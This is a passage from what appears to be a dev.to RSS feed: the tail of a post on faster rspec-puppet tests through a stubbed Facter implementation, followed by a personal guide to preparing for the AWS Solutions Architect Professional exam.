  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;value&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fact_name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="vi"&gt;@facts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;fact_name&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;to_s&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{},&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;block&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="s1"&gt;'Facter.add expects a block'&lt;/span&gt; &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="nb"&gt;block_given?&lt;/span&gt;
    &lt;span class="vi"&gt;@facts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;name&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;to_s&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;instance_eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;block&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;
  &lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;With our custom implementation we bypassed Facter altogether. This managed to bring us back to Facter 2 speeds, which behaved similarly by just returning the custom fact's value without resolving any additional facts.&lt;/p&gt;

&lt;p&gt;Of course, there may be downsides to this approach, as Facter code paths will no longer be executed by rspec-puppet. In the past there have been occasions where we merged Facter work that passed our CI, but ended up failing in module tests, so switching to this implementation will get rid of this level of testing. I'd argue that it wasn't a module's business to validate Facter itself, but it was a good safety net for us as maintainers.&lt;/p&gt;

&lt;p&gt;And because performance improvements mean nothing without showing the numbers, here's how test times have changed for the &lt;a href="https://github.com/puppetlabs/puppet-nginx"&gt;puppet-nginx&lt;/a&gt; module:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--N_0nFVA4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vwhqmqiit3i2n0x3n318.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--N_0nFVA4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vwhqmqiit3i2n0x3n318.png" width="880" height="323"&gt;&lt;/a&gt;&lt;br&gt;Running &lt;code&gt;rake parallel_spec&lt;/code&gt; on the module using Puppet 7 / Facter 4 took around 47 minutes with the original rspec-puppet implementation.
  &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Akhy4w-z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jg65snejczql6wj99ym2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Akhy4w-z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jg65snejczql6wj99ym2.png" width="880" height="313"&gt;&lt;/a&gt;&lt;br&gt;We managed to shave off around 11 minutes off the test run by using the custom Facter implementation in rspec-puppet.
  &lt;/p&gt;

&lt;p&gt;One thing I haven't mentioned is that running the same tests with Puppet 6 takes &lt;a href="https://github.com/GabrielNagy/puppet-nginx/runs/4149964576"&gt;a total of 25 minutes&lt;/a&gt;, so there's more to improve in Puppet itself as well.  However, from a Facter standpoint it's impossible to make the tests any faster, unless Ruby itself improves hash access speed 😜.&lt;/p&gt;

&lt;p&gt;This new functionality is opt-in and configurable by setting the &lt;a href="https://github.com/puppetlabs/rspec-puppet#facter_implementation"&gt;&lt;code&gt;facter_implementation&lt;/code&gt;&lt;/a&gt; RSpec option in your &lt;code&gt;spec_helper.rb&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="no"&gt;RSpec&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;configure&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;facter_implementation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="ss"&gt;:rspec&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It was first &lt;a href="https://github.com/puppetlabs/rspec-puppet/pull/16"&gt;made available&lt;/a&gt; in rspec-puppet &lt;a href="https://rubygems.org/gems/rspec-puppet/versions/2.11.0"&gt;2.11.0&lt;/a&gt;, with an additional &lt;a href="https://github.com/puppetlabs/rspec-puppet/pull/19"&gt;bugfix&lt;/a&gt; that was released in rspec-puppet &lt;a href="https://rubygems.org/gems/rspec-puppet/versions/2.11.1"&gt;2.11.1&lt;/a&gt;.&lt;/p&gt;




&lt;p&gt;The investigation and work surrounding this improvement has spanned many months and was the product of multiple Puppet employees and community members, namely &lt;a href="https://github.com/gimmyxd"&gt;Gimmy&lt;/a&gt;, &lt;a href="https://github.com/joshcooper"&gt;Josh Cooper&lt;/a&gt;, &lt;a href="https://github.com/ekohl"&gt;Ewoud Kohl van Wijngaarden&lt;/a&gt; and &lt;a href="https://github.com/bastelfreak"&gt;Tim Meusel&lt;/a&gt;. Thanks to everyone who contributed!&lt;/p&gt;

</description>
      <category>puppet</category>
      <category>ruby</category>
      <category>rspec</category>
      <category>testing</category>
    </item>
    <item>
      <title>How to Pass the AWS Solutions Architect Professional Exam</title>
      <author>luan vu</author>
      <pubDate>Sat, 22 Jan 2022 09:53:23 +0000</pubDate>
      <link>https://dev.to/luanvu/how-to-pass-the-aws-solutions-architect-professional-exam-4f34</link>
      <guid>https://dev.to/luanvu/how-to-pass-the-aws-solutions-architect-professional-exam-4f34</guid>
      <description>&lt;p&gt;You are looking to take the AWS Certified Solutions Architect — Professional certification exam. Today I will help you with some tips &amp;amp; tricks that I learned during my professional exam preparation two years ago.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#how-i-passed-the-new-aws-solutions-architect-professional"&gt;
  &lt;/a&gt;
  How I PASSED the New AWS Solutions Architect Professional?
&lt;/h2&gt;

&lt;p&gt;Another guide to the certification exam, probably reading the White Paper, watching videos on YouTube, taking that course, etc. No! Such articles are present on the internet a lot. I can get you some:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;a href="https://acloud.guru/forums/aws-csa-pro-2019/discussion/-L_joCzK9FTbpP2P7H0Z/how_i_passed_the_new_aws_solut"&gt;How I PASSED the New AWS Solutions Architect Professional (Feb 2019 version) exam last March 9!&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://acloud.guru/forums/aws-csa-pro-2019/discussion/-Lc31u8nAIbpeo9q9mM7/aws_certified_solutions_archit"&gt;AWS Certified Solutions Architect --- Professional 2019 (feedback)&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://virtualbonzo.com/2020/02/03/my-aws-solution-architect-professional-certification-experience/"&gt;My AWS Solution Architect Professional Certification Experience&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://medium.com/grey-frogs/my-path-to-aws-certified-solutions-architect-professional-bebd42eb5d5"&gt;My path to AWS Certified Solutions Architect --- Professional&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://acloud.guru/forums/aws-certified-solutions-architect-professional/discussion/-KEAY5AHdre2DzoI-H99/passed-sa-pro-today"&gt;Passed SA Pro today&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Those articles are already too many, and adding one of mine is nothing more. Are the other people correct? Right. But to do it is not as easy as it sounds. The exam depends on your ability to learn and your background knowledge. If you study for four months, you will die (I have looked for a whole year, what a shame), but you could still don't pass no matter an entire year's preparation.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#what-is-the-standard-learning-path"&gt;
  &lt;/a&gt;
  What is the standard learning path?
&lt;/h3&gt;

&lt;p&gt;In general, The path to passing the AWS certification exam includes (don't miss anything):&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-read-white-papers"&gt;
  &lt;/a&gt;
  1.  Read White papers
&lt;/h3&gt;

&lt;p&gt;There are hundreds of White papers, some with thousands of pages. Can you read it all? No matter how many you read, how much are you able to remember?&lt;/p&gt;

&lt;p&gt;I just checked, now there are 314 White Paper &amp;amp; Guides; you can check them at &lt;a href="https://aws.amazon.com/whitepapers/?whitepapers-main.sort-by=item.additionalFields.sortDate&amp;amp;whitepapers-main.sort-order=desc&amp;amp;awsm.page-whitepapers-main=1"&gt;AWS Whitepapers &amp;amp; Guides&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You should read all the essential White Papers mentioned in those articles above.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-read-faqs"&gt;
  &lt;/a&gt;
  2.  Read FAQs
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://aws.amazon.com/faqs/"&gt;AWS | FAQs&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;FAQs are also important. You should read all.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-watch-aws-reinvent-this-is-my-architecture-in-youtube"&gt;
  &lt;/a&gt;
  3.  Watch AWS re:Invent, This Is My Architecture in YouTube
&lt;/h3&gt;

&lt;p&gt;If you don't have much chance to try services architectures (like me), these videos are beneficial. They show you how a service should be used in actual projects (the exam too, of course) and how a group of services interact in architecture to resolve problems.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.youtube.com/c/amazonwebservices/search?query=AWS%20Re%3Ainvent"&gt;Amazon Web Services&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#4-take-some-onlineoffline-courses"&gt;
  &lt;/a&gt;
  4.  Take some online/offline courses
&lt;/h3&gt;

&lt;p&gt;It is the easiest to access. Many (most) AWS courses are available, both paid and paid. AWS also has some Exam Readiness (Free) to guide you through the exam questions&lt;/p&gt;

&lt;p&gt;&lt;a href="https://aws.amazon.com/training/course-descriptions/exam-workshop-solutions-architect-professional/"&gt;Exam Readiness: AWS Certified Solutions Architect --- Professional&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;There are many types of courses, but they are not enough in general. Especially some of the default courses require you to have a good knowledge of AWS and the overview for you. If you stick to them only, failure is inevitable.&lt;/p&gt;

&lt;p&gt;I found a precious course on Udemy. It could be more expensive than usual, but the author deserves it.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.udemy.com/share/104sE03@v25ocWwp5mS6EczCcLEoR6xjbdtVk0GPohkBLMVwUaLf4HB5bd4GAH_1dxW_J10=/"&gt;https://www.udemy.com/share/104sE03@v25ocWwp5mS6EczCcLEoR6xjbdtVk0GPohkBLMVwUaLf4HB5bd4GAH_1dxW_J10=/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Fun Fact: The first time I took the exam, It hit me in the face with a service called Amazon Mechanical Turk, which didn't appear in any of the White Papers, FAQs, or AWS Console. I think it is a question that has not been scored, so don't worry if AWS gives you such a surprise.&lt;/em&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#5-practice"&gt;
  &lt;/a&gt;
  5.  Practice
&lt;/h3&gt;

&lt;p&gt;Those learning materials are certainly informative, but it's hard to remember them all if you just read them and watch them do it. Practicing helps you understand better reflect better. Never skip practice any service.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#6-learn-english"&gt;
  &lt;/a&gt;
  6.  Learn English
&lt;/h3&gt;

&lt;p&gt;It's serious. It depends on the certification level you take the exam. With Professional, I took the exam, and all questions are very long; printing must also be over 50 pages. As I read and thought of the answer, it was indeed a terrible sprint. For test takers whose native language is not English (non-English speakers or English as a Second Language), AWS allows you to request accommodations, whereby you get a bonus of 30 minutes each time, so take advantage of it.&lt;/p&gt;

&lt;p&gt;Many of you are probably shocked and don't dare to study, but that's the truth. This test is challenging, requiring hundreds of hours of study and practice. You should have terrible determination to make it through. Fortunately, Amazon will only test you on a few essential services. If you know (to the point of mastering) them, you have achieved over 80%. And if you don't understand these services and lose points, then strange services you never touch will be a lifesaver, but it is boundless knowledge. That is why AWS Solutions Architect Professional is touched, it is difficult to understand something deeply, and if it is broad, it is too wide to understand it all.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#tip-amp-trick"&gt;
  &lt;/a&gt;
  Tip &amp;amp; Trick
&lt;/h2&gt;




&lt;p&gt;I'm not a person who can remember well. I tried to learn by going from service to service and memorizing them. According to statistics, I have read at least 47 full books about AWS, about 10--20 White Papers. However, the more I try to remember, the more I forget, learning 10--20 services, overlooking the first ones, reading a lot of books also forgetting quite a bit. So, I chose to study on my own.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#service-classification"&gt;
  &lt;/a&gt;
  Service classification
&lt;/h3&gt;

&lt;p&gt;AWS has already categorized it for you at &lt;a href="https://aws.amazon.com/products/"&gt;https://aws.amazon.com/products/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Service classification is critical. It helps you know what you face and how you deal with it. If you encounter a storage service, you need to know security, capacity, availability, and reliability. If you use databases, remember it is RDBMS or NoSQL, cache, or Big data.&lt;/p&gt;

&lt;p&gt;It also helps you to remember the service better. There are various service names you have never heard before, so classification helps you have some idea about it. For instance, EC2 Auto Scaling or Elastic Load Balancer sounds reminiscent, but what do you think Neptune's purpose? Universe? Snowball, Glacier, etc.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#based-on-wellarchitected-frameworks-five-pillars"&gt;
  &lt;/a&gt;
  Based on Well-Architected Framework's Five Pillars
&lt;/h3&gt;

&lt;p&gt;Well-Architected Framework provides guidelines to help customers deploy systems on AWS. The framework offers five main pillars:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Security&lt;/li&gt;
&lt;li&gt;  Reliability&lt;/li&gt;
&lt;li&gt;  Performance Efficiency&lt;/li&gt;
&lt;li&gt;  Cost Optimization&lt;/li&gt;
&lt;li&gt;  Operational Excellence&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When encountering any service, you need to think about these pillars.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-security"&gt;
  &lt;/a&gt;
  1.  Security
&lt;/h3&gt;

&lt;p&gt;AWS places great emphasis on security across all architects. There are two main types of security that you need to know:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Security operations&lt;/li&gt;
&lt;li&gt;  Data protection&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;
  &lt;a href="#security-operations"&gt;
  &lt;/a&gt;
  Security operations
&lt;/h4&gt;

&lt;p&gt;There are always employees who do wrong things they are not authorized to do or should not do. Those are why there are services like IAM, Organizations, Cognito, CloudTrail, etc. When learning a specific service, you must know how to grant access or limit it. Amazon S3, how to not allow others to publish it? How do I allow access to someone with another AWS account (and only them)? How to prevent someone from Terminating EC2 instances? Knowing what a service can do is important, but securing it is just as important.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#data-protection"&gt;
  &lt;/a&gt;
  Data protection
&lt;/h4&gt;

&lt;p&gt;You must get used to the concept of Encrypt at rest and Encrypt in transit. Is data stored in Storage encrypted? Is it encrypted when transferring data to the internet or on-premises via VPN? Most services are encrypted in transit by default, but encrypt at rest is not (Encryption is not enabled by default on EBS). There are still a lot of demanding customers out there. They require even more security. Have to use CloudHSM, use their certificate, or use end-to-end encryption too, and it's tough as well. You will become confusing with such services as KMS, CloudHSM, Direct Connect, Security Hub, Transit Gateway, VPN, etc... Still, it will frequently appear in the exam because that's how enterprise applications are built.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-resiliency-availability-and-disaster-recovery-dr"&gt;
  &lt;/a&gt;
  2.  Resiliency: Availability and Disaster Recovery (DR)
&lt;/h3&gt;

&lt;p&gt;High Availability, Blue/Green Deployment, Zero Down Time, Uptime, service level agreement (SLA), recovery time objective (RTO), recovery point objective (RPO), Redundancy, Failback, etc. You must go into deep dives on it.&lt;/p&gt;

&lt;p&gt;Maybe the projects you have done or are doing are at an elementary level: one server, one database, one data center, etc. Stop and start again. But when it came to AWS, the architecture standard took a new high level. Your system must be redundant for everything: hardware failure leading to server stop or data loss. Possibilities like hurricanes, earthquakes, and volcanoes destroy a data center. Even, you have to consider the case of the main error from AWS.&lt;/p&gt;

&lt;p&gt;You need to know four ways to preserve the system&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Backup and Restore&lt;/li&gt;
&lt;li&gt;  Pilot Light&lt;/li&gt;
&lt;li&gt;  Warm Standby&lt;/li&gt;
&lt;li&gt;  Multi-site Example&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For example, EC2 only guarantees 95.0% availability, which means every 1 hour, EC2 can be down for 3 minutes. We need to combine with Auto Scaling Group, Load Balancer to increase availability. More advanced, use Cross-region Load Balancer, Multi-site between AWS infrastructure and on-premises. The Serverless option can also be considered as an alternative. What about data? EC2 stores data in EBS. How to ensure no data loss? By now, you will probably have to know things like RAID, Snapshot, Point-in-time-recovery (PITR).&lt;/p&gt;

&lt;p&gt;Similarly, in RDS, we have RDS snapshot, backtrack, Replica, Multi-AZ, etc. With ElastiCache, there is also Multi A-Z, Failover, Append Only Files (AOF)...You also need to know how long it takes to recover (RTO) and how much data can be lost (RPO). If customers need to restore the system within 1 hour, storing it in Glacier is wrong.&lt;br&gt;
Refer&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;a href="https://aws.amazon.com/blogs/publicsector/rapidly-recover-mission-critical-systems-in-a-disaster/"&gt;Rapidly recover mission-critical systems in a disaster&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://cloud.netapp.com/blog/understanding-aws-high-availability-compute-sql-and-storage"&gt;AWS High Availability: Compute, SQL and Storage&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://aws.amazon.com/blogs/startups/high-availability-for-mere-mortals/"&gt;High Availability for Mere Mortals&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#3-performance"&gt;
  &lt;/a&gt;
  3.  Performance
&lt;/h3&gt;

&lt;p&gt;The performance here is understood as using computing resources to meet system requirements and maintain performance when conditions change or technology evolves. Some of the issues raised could be:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Latency&lt;/li&gt;
&lt;li&gt;  IOPS&lt;/li&gt;
&lt;li&gt;  Throughput&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When choosing a service to use for your architecture, there are four types of resources you need to consider: compute, storage, database, and network.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#compute"&gt;
  &lt;/a&gt;
  Compute
&lt;/h4&gt;

&lt;p&gt;There are three main types of computing:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;em&gt;Instance&lt;/em&gt;: a virtual server, typically EC2 and Lightsail. You can use EC2 to solve everything if there is no other option. For example, launch a MySQL server inside an EC2 instance.&lt;/li&gt;
&lt;li&gt;  &lt;em&gt;Container&lt;/em&gt;: this is a way of virtualizing the operating system, I can immediately think of Docker, Kubernetes. With AWS, think about ECS, Fargate, and EKS. When to use Container instead of Instance? Most of the answers (in the test) will be customers who already use on-premises containers and want to spend the least amount of effort if migrating to AWS.&lt;/li&gt;
&lt;li&gt;  &lt;em&gt;Function&lt;/em&gt;: focus on code and run without having to manage instances. Functions have three essential benefits: minimal management effort, outstanding scalability and are particularly suitable for event-based programs.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;
  &lt;a href="#storage"&gt;
  &lt;/a&gt;
  Storage
&lt;/h4&gt;

&lt;p&gt;There are three main types of storage:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Object Storage: just S3&lt;/li&gt;
&lt;li&gt;  Block Storage: just EBS&lt;/li&gt;
&lt;li&gt;  File Storage: EFS, FSx&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In my opinion, Storage Gateway should also be included here. The storage classification doesn't make much sense either. You can save it in Object Storage, Block Storage, or File Storage with a file. However, there is a slight difference. E.g., S3 is limited to 3,500 PUT/COPY/POST/DELETE and 5,500 GET/HEAD requests per second per prefix (directory name), and don't forget there's also a KMS limit if you choose to encrypt. And yet, accessing files from S3 will have extremely high latency. Think about them when you use them. With EBS, it is necessary to know the difference between the volume types, which are optimal for IOPS? Which are optimal for Throughput? If you need even higher performance, you can think of RAID, but what are the disadvantages of RAID? Data loss, Downtime. EBS still has certain limitations: IOPS, Throughput, Hybrid Storage, Limit storage size, Sharing, Availability, etc. Then you will need to use EFS.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#database"&gt;
  &lt;/a&gt;
  Database
&lt;/h4&gt;

&lt;p&gt;Databases can be divided into seven types:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Relational: RDS&lt;/li&gt;
&lt;li&gt;  Key-Value: DynamoDB, or maybe even Redis&lt;/li&gt;
&lt;li&gt;  Document: DocumentDB&lt;/li&gt;
&lt;li&gt;  In-Memory: ElastiCache, MemoryDB (new)&lt;/li&gt;
&lt;li&gt;  Graph: Neptune&lt;/li&gt;
&lt;li&gt;  Time-Series: Timestream&lt;/li&gt;
&lt;li&gt;  Ledger: QLDB&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each type of database will be used for different purposes, but sometimes it is not too noticeable.&lt;/p&gt;

&lt;p&gt;E.g., Customers using MySQL on-premises does not mean that going to AWS is required to use RDS. That's also just an option. Another option could be MySQL on EC2 instance, converting MySQL to DynamoDB.&lt;/p&gt;

&lt;p&gt;If you want a database with high access frequency low latency, it can be DynamoDB, but if the data is not too necessary, ElastiCache is also a good choice.&lt;/p&gt;

&lt;p&gt;In general, the database selection problem is not too complex. Usually, the question will revolve around the issue of optimizing a particular type of database.&lt;/p&gt;

&lt;p&gt;E.g., the customer is using MySQL on RDS and is noticing slow response as traffic increases. Think about multi-writer, multi-reader, and maybe even ElastiCache to reduce RDS load.&lt;/p&gt;

&lt;p&gt;Refer:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;a href="https://www.youtube.com/watch?v=q81TVuV5u28&amp;amp;ref=wellarchitected"&gt;AWS re:Invent 2019: Leadership session: AWS purpose-built databases (DAT209-L)&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;
  &lt;a href="#network"&gt;
  &lt;/a&gt;
  Network
&lt;/h4&gt;

&lt;p&gt;All AWS components are connected through a network, AWS's private network, or the internet.&lt;/p&gt;

&lt;p&gt;EC2 instances connect to EBS through the internal network; Route53, CloudFront, S3 in/out internet; the connection between AWS and on-premises... In this regard, there are several standard solutions:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  CloudFront can reduce latency when accessing global&lt;/li&gt;
&lt;li&gt;  Deploying (adding a system) on a region near the user is also the best way to reduce latency&lt;/li&gt;
&lt;li&gt;  Upload/Download on S3 is slow: Use S3 transfer acceleration&lt;/li&gt;
&lt;li&gt;  Connecting to On-premises using VPN is slow: Spend more money to use Direct Connect&lt;/li&gt;
&lt;li&gt;  Latency-Based Routing in Amazon Route 53&lt;/li&gt;
&lt;li&gt;  Use VPC Endpoints to use AWS's internal network
Refer&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wat.question.PERF_1.en.html"&gt;PERF 1: How do you select the best performing architecture?&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wat.question.PERF_2.en.html"&gt;PERF 2: How do you select your compute solution?&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wat.question.PERF_3.en.html"&gt;PERF 3: How do you select your storage solution?&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wat.question.PERF_4.en.html"&gt;PERF 4: How do you select your database solution?&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wat.question.PERF_5.en.html"&gt;PERF 5: How do you configure your networking solution?&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wat.question.PERF_6.en.html"&gt;PERF 6: How do you evolve your workload to take advantage of new releases?&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wat.question.PERF_7.en.html"&gt;PERF 7: How do you monitor your resources to ensure they are performing?&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wat.question.PERF_8.en.html"&gt;PERF 8: How do you use tradeoffs to improve performance?&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wat.pillar.performance.en.html"&gt;Performance Efficiency&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#4-cost"&gt;
  &lt;/a&gt;
  4.  Cost
&lt;/h3&gt;

&lt;p&gt;Usually, there are two scenarios:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Customers already have the system and want to reduce the price&lt;/li&gt;
&lt;li&gt;  Customers want to migrate to AWS for the lowest possible price.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So how to optimize the price:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Choose cheaper services. When to use Kinesis instead of SQS? When to use a VPN instead of Direct Connect? When to use Spot Instances?&lt;/li&gt;
&lt;li&gt;  Remove unnecessary resources.&lt;/li&gt;
&lt;li&gt;  Commitment: Savings Plans, Reserved Instances&lt;/li&gt;
&lt;li&gt;  Cost Management: Consolidated Billing, Cost Allocation Tags, Trust Advisor,...&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And finally, remember, optimizing for price also comes at the expense of other things (performance, availability, reliability, security, etc.). The architecture you choose may not be perfect, but it is still the correct answer if it is feasible and the most cost-effective according to the customer's requirements.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#5-operational-excellence"&gt;
  &lt;/a&gt;
  5.  Operational Excellence
&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;"The Operational Excellence pillar includes the ability to support development and run workloads effectively, gain insight into their operations, and to continuously improve supporting processes and procedures to deliver business value"&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It depends on services, but there are some common aspects:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  Infrastructure as code: in short, CloudFormation, Opsworks. You don't need to understand what Ansible or Puppet is, but you should know what Opsworks is and what it is suitable for. You also don't need to master the CloudFormation template, but you must know some basic syntax and create some services by CloudFormation, such as VPC, Subnets, RDS...&lt;/li&gt;
&lt;li&gt;  Basic settings: some services have unique settings you must be familiar. E.g.: could I change Lambda CPU configuration? Restore an RDS snapshot, make a failover on an RDS instance? Change Launch Template, etc.&lt;/li&gt;
&lt;li&gt;  Monitoring, Incident response: logging, metric visualizer, alarms, incident management, and remediation&lt;/li&gt;
&lt;li&gt;  Some managed operator services: there are some services you should get to know, such as CloudTrail, Config, Personal Health Dashboard, Organizations, Service Catalog, Systems Manager.
Refer&lt;/li&gt;
&lt;li&gt;  &lt;a href="https://wa.aws.amazon.com/wellarchitected/2020-07-02T19-33-23/wat.pillar.operationalExcellence.en.html"&gt;https://wa.aws.amazon.com/wellarchitected/2020-07-02T19-33-23/wat.pillar.operationalExcellence.en.html&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#dont-trust-keywords"&gt;
  &lt;/a&gt;
  Don't trust keywords
&lt;/h3&gt;

&lt;p&gt;When taking the exam, many of you will have a trick that believes in the keyword, see this keyword, and immediately decide. But here, things are not so clear. If you insist on choosing the most appropriate service, it is easy to lead you to the wrong architecture because this is a collection of services and methods, not a story of just one service.&lt;/p&gt;

&lt;p&gt;E.g., When a customer needs a Relational database, RDS comes to mind, but don't forget you could also use EC2 and launch the database on its instance. Why does it? Because of the cost, there are features of the database that RDS does not support.&lt;/p&gt;

&lt;p&gt;When customers think of storing static data, you think of S3. But, saving in EBS, EFS is also away.&lt;/p&gt;

